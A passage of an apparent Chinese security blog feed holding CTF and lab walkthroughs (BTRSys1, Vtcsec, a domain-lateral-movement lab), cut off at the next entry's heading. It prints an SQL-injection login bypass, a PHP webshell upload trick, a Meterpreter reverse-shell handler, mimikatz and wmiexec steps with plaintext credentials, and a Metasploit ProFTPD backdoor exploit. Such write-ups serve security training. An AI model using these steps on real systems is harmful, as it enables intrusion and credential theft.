<code>SSF</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Win10：ssfd.exe -p 1050</span><br><span class="line">KALI：./ssf -F 1051 -p 1050 192.168.1.103</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/927.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/928.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/929.png" alt="图片"></p><h2 id="获取域控密码拿到Flag"><a href="#获取域控密码拿到Flag" class="headerlink" title="获取域控密码拿到Flag"></a>获取域控密码拿到Flag</h2><p>代理成功后我们通过 <code>wmiexec</code> 去连接 <code>windows 2008</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.exe administrator:123qwe!ASD@192.168.93.20</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/930.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/931.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/932.png" alt="图片"></p><p>查看 <code>Windows 2008</code> 的 <code>ip</code> 后发现 <code>dns</code> 为 <code>test.org</code>，接着 <code>ping test.org</code> 获取到了域控制器的 <code>IP</code> ：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;ping test.org</span><br><span class="line"></span><br><span class="line">Pinging test.org [192.168.93.10] with 32 bytes of data:</span><br><span class="line">Reply from 192.168.93.10: bytes=32 time&lt;1ms TTL=128</span><br><span class="line">Reply from 192.168.93.10: bytes=32 time&lt;1ms TTL=128</span><br><span class="line">Reply from 192.168.93.10: bytes=32 time&lt;1ms TTL=128</span><br><span class="line">Reply from 192.168.93.10: bytes=32 time&lt;1ms TTL=128</span><br><span class="line"></span><br><span class="line">Ping statistics <span class="keyword">for</span> 192.168.93.10:</span><br><span class="line">    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),</span><br><span class="line">Approximate round trip <span class="built_in">times</span> <span class="keyword">in</span> milli-seconds:</span><br><span class="line">    Minimum = 0ms, Maximum = 0ms, Average = 0ms</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/933.png" alt="图片"></p><p>这个时候尝试抓取 <code>test.org</code> 域里的 <code>administrator</code> 密码，先上传一个 <code>mimikatz</code> 到 <code>windows2008</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxychains smbclient //192.168.93.20/C$ -U administrator</span><br><span class="line">put mimikatz.exe</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/934.png" alt="图片"></p><p>之后本来想用 <code>mimikatz</code> 读取密码的，但是在 <code>dos</code> 下进入不了 <code>mimikatz</code> 的交互界面…还是太菜了！我接着 <code>MSF</code> 生成了一个木马得到了 <code>Windows 2008</code> 的<code>shell</code>，然后直接运行 <code>getsystem</code> 得到了 <code>SYSTEM</code> 权限 ：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/935.png" alt="图片"></p><p>然后上传了一个 <code>mimikatz</code> 直接读取到了明文密码：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/936.png" alt="图片"></p><p>最后通过 <code>smb</code> 连接到了<code>2012</code>机器拿到 <code>flag</code>：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/937.png" alt="图片"></p><p>今年最后一篇文章就到这吧，明年再战！</p><h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><p><strong>若有好的建议和合作可以通过公众号与我联系！</strong><br>微信公众号：<code>渗透攻击红队</code><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/logo/vxgzh.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> RedTeaming </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 权限提升 </tag>
            
            <tag> CTF </tag>
            
            <tag> ATTCK </tag>
            
            <tag> RedTeaming </tag>
            
            <tag> 横向渗透 </tag>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-BTRsys1_WriteUp，通过Sql注入绕过登陆界面获取shell拿Root</title>
      <link href="/2019/12/28/CTF-BTRsys1/"/>
      <url>/2019/12/28/CTF-BTRsys1/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=504686387&auto=1&height=66"></iframe><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/875.png" alt="图片"></p><p>HackGame：<code>BTRSys1</code><br>靶场<code>IP</code>：<code>10.10.10.137</code><br>任务：拿到<code>root</code>用户</p><h2 id="学习到的知识"><a href="#学习到的知识" class="headerlink" title="学习到的知识"></a>学习到的知识</h2><p>通过<code>Sql</code>注入（类似于万能密码）绕过登陆<br>通过白名单验证图片上传限制</p><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>拿到靶机<code>IP</code>后首先<code>NMAP</code>扫扫端口开放服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -T4 10.10.10.137</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/858.png" alt="图片"></p><p>它是开放了<code>21</code>(ftp)、<code>22</code>(ssh)、<code>80</code>(http)三个端口，其中<code>ftp</code>运行<code>匿名用户</code>登陆，我们首先使用匿名用户登陆一下<code>ftp</code>看看,这把使用的是<code>Windows</code>下自带的<code>ftp</code>协议，直接在文件夹里输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp://10.10.10.137</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/859.png" alt="图片"></p><p>登陆进去发现没有任何文件，那么<code>ftp</code>无果后我来到了<code>80</code>端口看看能不能从<code>web</code>来突破：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.10.137</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/860.png" alt="图片"></p><p>从页面上我没有找到可利用的地方，我遍开始对它进行爆破枚举网站目录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://10.10.10.137</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http://10.10.10.137/ ----</span><br><span class="line">+ http://10.10.10.137/login.php (CODE:200|SIZE:4561)                                                                                                                     </span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.137/assets/                                                                                                                               </span><br><span class="line">+ http://10.10.10.137/index.php (CODE:200|SIZE:758)                                                                                                                      </span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.137/javascript/                                                                                                                           </span><br><span class="line">+ http://10.10.10.137/server-status (CODE:403|SIZE:292)                                                                                                                  </span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.137/uploads/  </span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/861.png" alt="图片"></p><p>其中<code>login.php</code>引起了我的注意：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.10.137/login.php</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/862.png" alt="图片"></p><p>它很显然是一个登陆的页面，尝试了<code>弱口令</code>无结果，审查元素看了看源代码发现了一段<code>JS</code>:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">control</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> user = <span class="built_in">document</span>.getElementById(<span class="string">&quot;user&quot;</span>).value;</span><br><span class="line">    <span class="keyword">var</span> pwd = <span class="built_in">document</span>.getElementById(<span class="string">&quot;pwd&quot;</span>).value;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> str=user.substring(user.lastIndexOf(<span class="string">&quot;@&quot;</span>)+<span class="number">1</span>,user.length);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>((pwd == <span class="string">&quot;&#x27;&quot;</span>))&#123;</span><br><span class="line">alert(<span class="string">&quot;Hack Denemesi !!!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (str!=<span class="string">&quot;btrisk.com&quot;</span>)&#123;</span><br><span class="line">alert(<span class="string">&quot;Yanlis Kullanici Bilgisi Denemektesiniz&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">document</span>.loginform.submit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/863.png" alt="图片"></p><p>这段<code>JavaScript</code>代码对它的用户名进行判断，用户名必须要为<code>@btrisk.com</code>结尾，那么尝试一下注入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /personel.php HTTP/1.1</span><br><span class="line">Host: 10.10.10.137</span><br><span class="line">Content-Length: 53</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://10.10.10.137</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">X-Forwarded-For: 192.168.1.1</span><br><span class="line">Referer: http://10.10.10.137/login.php</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">kullanici_adi=hacker@btrisk.com&amp;parola=111&#x27;or 1=1 --+</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/864.png" alt="图片"></p><p>通过注入登陆进了后台发现了一个上传点，通过尝试上传脚本文件<code>PHP</code>发现不允许上传，只允许上传<code>JPG</code>和<code>PNG</code>格式的文件（白名单验证）</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/865.png" alt="图片"></p><p>那么我们就先把<code>PHP</code>脚本木马修改为<code>jpg</code>格式，然后抓包拦截吧后缀修改为<code>PHP</code>成功突破<code>白名单验证</code>：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/866.png" alt="图片"></p><p>通过<code>MSF</code>监听回来：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">set payload php/meterpreter/reverse_tcp</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set lhost 10.10.10.134</span><br><span class="line">set lport 8888</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/867.png" alt="图片"></p><p>因为刚刚扫描<code>WEB</code>目录的时候有一个<code>upload</code>目录，那个目录就是上传的路径：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/868.png" alt="图片"></p><p>访问脚本木马反弹<code>shell</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.10.137/uploads/2.php</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/869.png" alt="图片"></p><p>查看权限发现是一个网站普通权限，而且不是一个<code>bash</code>的shell，我们通过<code>Python</code>让它变成<code>bash</code>的shell：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/870.png" alt="图片"></p><p>通过在网站根目录<code>/vat/www/html</code>下发现了一个配置文件<code>config.php</code>:</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/871.png" alt="图片"></p><p>里面是<code>mysql</code>的连接账号密码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">user : root</span><br><span class="line">pass : toor</span><br><span class="line">database : deneme</span><br></pre></td></tr></table></figure><p>它只允许本地连接到<code>mysql</code>，那么我们就通过得到的账号密码连接到它的<code>mysql</code>数据库里：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -p</span><br><span class="line">pass : toor</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/872.png" alt="图片"></p><p>通过查看<code>deneme</code>数据库下的<code>user</code>表发现了账号密码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show databases;</span><br><span class="line">show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| deneme             |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">+--------------------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; use deneme;</span><br><span class="line">use deneme;</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; show tables;</span><br><span class="line">show tables;</span><br><span class="line">+------------------+</span><br><span class="line">| Tables_in_deneme |</span><br><span class="line">+------------------+</span><br><span class="line">| user             |</span><br><span class="line">+------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from user;</span><br><span class="line">select * from user;</span><br><span class="line">+----+-------------+------------------+-----------+---------+-------------+---------+-------------+--------------+</span><br><span class="line">| ID | Ad_Soyad    | Kullanici_Adi    | Parola    | BabaAdi | BabaMeslegi | AnneAdi | AnneMeslegi | KardesSayisi |</span><br><span class="line">+----+-------------+------------------+-----------+---------+-------------+---------+-------------+--------------+</span><br><span class="line">|  1 | ismail kaya | ikaya@btrisk.com | asd123*** | ahmet   | muhasebe    | nazli   | lokantaci   |            5 |</span><br><span class="line">|  2 | can demir   | cdmir@btrisk.com | asd123*** | mahmut  | memur       | gulsah  | tuhafiyeci  |            8 |</span><br><span class="line">+----+-------------+------------------+-----------+---------+-------------+---------+-------------+--------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/873.png" alt="图片"></p><p>最终得到的密码成功切换到<code>root</code>用户：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/874.png" alt="图片"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>首先是通过扫描目录来到了一个登陆页面，通过<code>Sql</code>注入进入到了上传页面，通过白名单绕过得到了一枚<code>shell</code>。最后通过在数据库配置文件中找到了<code>mysql</code>的连接信息拿到账号密码，最终拿到<code>root</code>用户!</p><h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><p><strong>若有好的建议和合作可以通过公众号与我联系！</strong><br>微信公众号：<code>渗透攻击红队</code><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/logo/vxgzh.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> CTF </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-Vtcsec_WriteUp，ProFTPD软件后门未授权访问提权拿到Flag</title>
      <link href="/2019/12/27/CTF-Vtcsec/"/>
      <url>/2019/12/27/CTF-Vtcsec/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=499793274&auto=1&height=66"></iframe><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/850.png" alt="图片"></p><p>靶场名字：<code>Vtcsec</code><br>操作系统：<code>Linux</code><br>任务：拿到<code>/root/flag/</code><br>靶场IP：<code>10.10.10.126</code></p><h2 id="学习到的知识"><a href="#学习到的知识" class="headerlink" title="学习到的知识"></a>学习到的知识</h2><p><code>ProFTPD</code>后门未经授权访问漏洞导致远程命令执行</p><p><code>Metasploit</code>对<code>ProFTPD 1.3.3c</code>程序进行远程命令执行</p><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>拿到 <code>IP</code> 后直接丢到<code>NMAP</code>一顿搜哈：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -T4 10.10.10.126</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/851.png" alt="图片"></p><p>由上图得知，靶场开放了<code>21</code>（ftp）、<code>22</code>（ssh）、<code>80</code>（http）服务器，其中21所使用的ftp软件是<code>ProFTPD 1.3.3c</code>，<code>ProFTPD</code>是一个在<code>Linux</code>或者<code>Unix</code>下的<code>FTP</code>服务器程序！</p><p>还是老规矩，先搜索软件有没有对应的漏洞（这是习惯）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit ProFTPD 1.3.3c</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/852.png" alt="图片"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">------------------------------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                                                                                     |  Path</span><br><span class="line">                                                                                                                   | (/usr/share/exploitdb/)</span><br><span class="line">------------------------------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">ProFTPd 1.3.3c - Compromised Source Backdoor Remote Code Execution                                                 | exploits/linux/remote/15662.txt</span><br><span class="line">ProFTPd-1.3.3c - Backdoor Command Execution (Metasploit)                                                           | exploits/linux/remote/16921.rb</span><br><span class="line">------------------------------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">Shellcodes: No Result</span><br></pre></td></tr></table></figure><p>从搜索的结果得知有两个漏洞：第一个是<code>Compromised Source Backdoor Remote Code Execution</code>(后门远程代码执行)、第二个是<code>Backdoor Command Execution</code>(后门命令执行,基于<code>Metasploit</code>里).</p><p>既然它存在<code>RCE</code>,那么直接用<code>Metasploit</code>来对它进行利用吧，打开<code>MSF</code>控制台：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure><p>然后搜索一下有关<code>ProFTPd-1.3.3c</code>的<code>Payload</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search ProFTPd-1.3.3c</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/853.png" alt="图片"></p><p>这个时候有一个漏洞利用模块：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit/unix/ftp/proftpd_133c_backdoor </span><br></pre></td></tr></table></figure><p>先看看有关它的信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info exploit/unix/ftp/proftpd_133c_backdoor </span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/854.png" alt="图片"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; info exploit/unix/ftp/proftpd_133c_backdoor </span><br><span class="line"></span><br><span class="line">       Name: ProFTPD-1.3.3c Backdoor Command Execution</span><br><span class="line">     Module: exploit/unix/ftp/proftpd_133c_backdoor</span><br><span class="line">   Platform: Unix</span><br><span class="line">       Arch: cmd</span><br><span class="line"> Privileged: Yes</span><br><span class="line">    License: Metasploit Framework License (BSD)</span><br><span class="line">       Rank: Excellent</span><br><span class="line">  Disclosed: 2010-12-02</span><br><span class="line"></span><br><span class="line">Provided by:</span><br><span class="line">  MC &lt;mc@metasploit.com&gt;</span><br><span class="line">  darkharper2</span><br><span class="line"></span><br><span class="line">Available targets:</span><br><span class="line">  Id  Name</span><br><span class="line">  --  ----</span><br><span class="line">  0   Automatic</span><br><span class="line"></span><br><span class="line">Check supported:</span><br><span class="line">  No</span><br><span class="line"></span><br><span class="line">Basic options:</span><br><span class="line">  Name    Current Setting  Required  Description</span><br><span class="line">  ----    ---------------  --------  -----------</span><br><span class="line">  RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax <span class="string">&#x27;file:&lt;path&gt;&#x27;</span></span><br><span class="line">  RPORT   21               yes       The target port (TCP)</span><br><span class="line"></span><br><span class="line">Payload information:</span><br><span class="line">  Space: 2000</span><br><span class="line">  Avoid: 0 characters</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  This module exploits a malicious backdoor that was added to the </span><br><span class="line">  ProFTPD download archive. This backdoor was present <span class="keyword">in</span> the </span><br><span class="line">  proftpd-1.3.3c.tar.[bz2|gz] archive between November 28th 2010 and </span><br><span class="line">  2nd December 2010.</span><br><span class="line"></span><br><span class="line">References:</span><br><span class="line">  OSVDB (69562)</span><br><span class="line">  http://www.securityfocus.com/bid/45150</span><br></pre></td></tr></table></figure><p>可以看到，这个模块是<code>后门命令执行</code>的模块，它只需要设置对方的<code>IP</code>和<code>端口</code>就可以，受限的版本是<code>proftpd-1.3.3c</code>,下面是有关它的漏洞介绍：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/855.png" alt="图片"></p><p><code>ProFTPD 1.3.3c</code>这个版本易于遭受<code>未经授权访问</code>漏洞。利用此漏洞，远程攻击者可以使用超级用户特权<code>执行任意系统命令</code>。</p><p>那么就直接使用它吧：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use exploit/unix/ftp/proftpd_133c_backdoor</span><br><span class="line"><span class="built_in">set</span> RHOSTS 10.10.10.136</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/856.png" alt="图片"></p><p>最后直接运行 <code>run</code> 得到一个 <code>sission</code>:</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/857.png" alt="图片"></p><p>最终通过得到的<code>sission</code>拿到了<code>root</code>权限，在<code>/root</code>目录下拿到<code>flag</code>完成本次<code>CTF</code>!</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过使用<code>Metasploit</code>来对<code>ProFTPD</code>进行<code>远程命令执行</code>，最终成功提权拿到<code>FLAG</code>!</p><h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><p><strong>若有好的建议和合作可以通过公众号与我联系！</strong><br>微信公众号：<code>渗透攻击红队</code><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/logo/vxgzh.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 权限提升 </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-Covfefe_WriteUp，通过SSH私钥泄露再到程序溢出提权得到Flag</title>
      <link href="/2019/12/26/CTF-Covfefe/"/>
      <url>/2019/12/26/CTF-Covfefe/</url>
      
